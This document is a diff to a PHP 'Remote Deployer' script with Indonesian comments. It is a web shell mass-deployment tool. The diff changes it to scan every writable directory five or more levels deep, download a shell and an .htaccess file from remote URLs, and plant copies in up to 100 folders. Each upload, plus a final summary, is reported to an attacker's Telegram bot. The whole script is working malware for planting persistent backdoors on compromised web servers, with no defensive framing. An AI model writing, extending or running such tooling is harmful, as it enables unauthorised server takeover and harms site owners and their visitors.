@@ -53,6 +53,7 @@ function downloadContent($url) {
 
 function generateRandomName() {
     $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    $randomString = '';
     
     for ($i = 0; $i < 6; $i++) {
         $randomString .= $characters[rand(0, strlen($characters) - 1)];
@@ -105,8 +106,9 @@ function getURLFromPath($fullPath) {
     return $baseURL . $relativePath;
 }
 
-function scanWritableDirectories($baseDir, $limit = 100) {
-    $writableDirs = [];
+// ========== FUNGSI YANG DIUPGRADE ==========
+function scanWritableDirectories($baseDir) {
+    $allTargets = [];
     
     try {
         $iterator = new RecursiveIteratorIterator(
@@ -116,22 +118,37 @@ function scanWritableDirectories($baseDir, $limit = 100) {
         );
         
         foreach($iterator as $item) {
-            if(count($writableDirs) >= $limit) break;
-            
             if($item->isDir() && $item->isWritable()) {
-                $writableDirs[] = $item->getPathname();
+                $fullPath = $item->getPathname();
+                
+                $relativePath = str_replace(rtrim($baseDir, '/'), '', $fullPath);
+                $relativePath = ltrim($relativePath, '/');
+                
+                if(empty($relativePath)) {
+                    continue;
+                }
+                
+                $parts = explode('/', $relativePath);
+                $depth = count($parts);
+                
+                // SIMPAN SEMUA FOLDER DENGAN KEDALAMAN 4+
+                if($depth >= 5) {
+                    $allTargets[] = $fullPath;
+                }
             }
         }
     } catch(Exception $e) {
         // Silent fail
     }
     
-    if(empty($writableDirs)) {
-        $writableDirs[] = $baseDir;
+    if(empty($allTargets)) {
+        return [$baseDir];
     }
     
-    shuffle($writableDirs);
-    return $writableDirs;
+    // ACAK AGAR DISTRIBUSI MERATA
+    shuffle($allTargets);
+    
+    return $allTargets;
 }
 
 function executeMassDeployment($root, $shellContent, $htaccessContent, $count = 30) {
@@ -143,17 +160,32 @@ function executeMassDeployment($root, $shellContent, $htaccessContent, $count = 
         'total_deployed' => 0
     ];
     
-    $targetDirectories = scanWritableDirectories($root, 50);
+    $targetDirs = scanWritableDirectories($root);
     
-    foreach($targetDirectories as $dir) {
-        if(count($results['success']) >= $count) break;
+    if(empty($targetDirs)) {
+        return $results;
+    }
+    
+    $totalAvailable = count($targetDirs);
+    $deployedCount = 0;
+    $currentIndex = 0;
+    
+    // BATASI TARGET SESUAI YANG TERSEDIA
+    $maxDeploy = min($count, $totalAvailable);
+    
+    while($deployedCount < $maxDeploy && !empty($targetDirs)) {
+        if($currentIndex >= count($targetDirs)) {
+            $currentIndex = 0;
+        }
+        
+        $dir = $targetDirs[$currentIndex];
         
         $deployment = deployToDirectory($dir, $shellContent, $htaccessContent);
         if($deployment) {
             $results['success'][] = $deployment;
             $results['total_deployed']++;
+            $deployedCount++;
             
-            // KIRIM NOTIFIKASI TELEGRAM
             $message = "✅ <b>SHELL BERHASIL DIUPLOAD</b>\n";
             $message .= "━━━━━━━━━━━━━━━━━━━━\n";
             $message .= "📁 <b>Directory:</b> " . $deployment['directory'] . "\n";
@@ -164,19 +196,21 @@ function executeMassDeployment($root, $shellContent, $htaccessContent, $count = 
             $message .= "#" . $results['total_deployed'];
             
             sendTelegram($BOT_TOKEN, $CHAT_ID, $message);
-            usleep(500000); // Delay 0.5 detik antar notifikasi
+            usleep(500000);
             
+            array_splice($targetDirs, $currentIndex, 1);
         } else {
             $results['failed']++;
+            array_splice($targetDirs, $currentIndex, 1);
         }
     }
     
-    // KIRIM SUMMARY KE TELEGRAM
     if($results['total_deployed'] > 0) {
         $summary = "📊 <b>DEPLOYMENT SUMMARY</b>\n";
         $summary .= "━━━━━━━━━━━━━━━━━━━━\n";
         $summary .= "✅ <b>Success:</b> " . $results['total_deployed'] . " shells\n";
         $summary .= "❌ <b>Failed:</b> " . $results['failed'] . " directories\n";
+        $summary .= "📁 <b>Total Folders Available:</b> " . $totalAvailable . "\n";
         $summary .= "🕐 <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
         $summary .= "━━━━━━━━━━━━━━━━━━━━\n";
         $summary .= "🌐 <i>GitHub Source Deployment</i>";
@@ -186,19 +220,18 @@ function executeMassDeployment($root, $shellContent, $htaccessContent, $count = 
     
     return $results;
 }
+// ========== AKHIR FUNGSI YANG DIUPGRADE ==========
 
 // EXECUTION HANDLER
 if(isset($_GET['action']) && $_GET['action'] == 'deploy') {
     header('Content-Type: text/html; charset=utf-8');
     
-    // Download fresh content setiap deployment
     $freshShellContent = downloadContent($SHELL_URL);
     $freshHtaccessContent = downloadContent($HTACCESS_URL);
     
     $deployCount = isset($_GET['count']) ? intval($_GET['count']) : 30;
     if($deployCount > 100) $deployCount = 100;
     
-    // Kirim notifikasi mulai deployment
     $startMsg = "🚀 <b>MULAI DEPLOYMENT</b>\n";
     $startMsg .= "━━━━━━━━━━━━━━━━━━━━\n";
     $startMsg .= "🎯 <b>Target:</b> " . $deployCount . " shells\n";
@@ -446,7 +479,7 @@ echo '<!DOCTYPE html>
         </div>
         
         <div class="footer">
-            Remote Deployer v6.0 | Telegram Integration | GitHub Source
+            Remote Deployer v7.0 | Full Scan Mode | Telegram Integration
         </div>
     </div>
 </body>
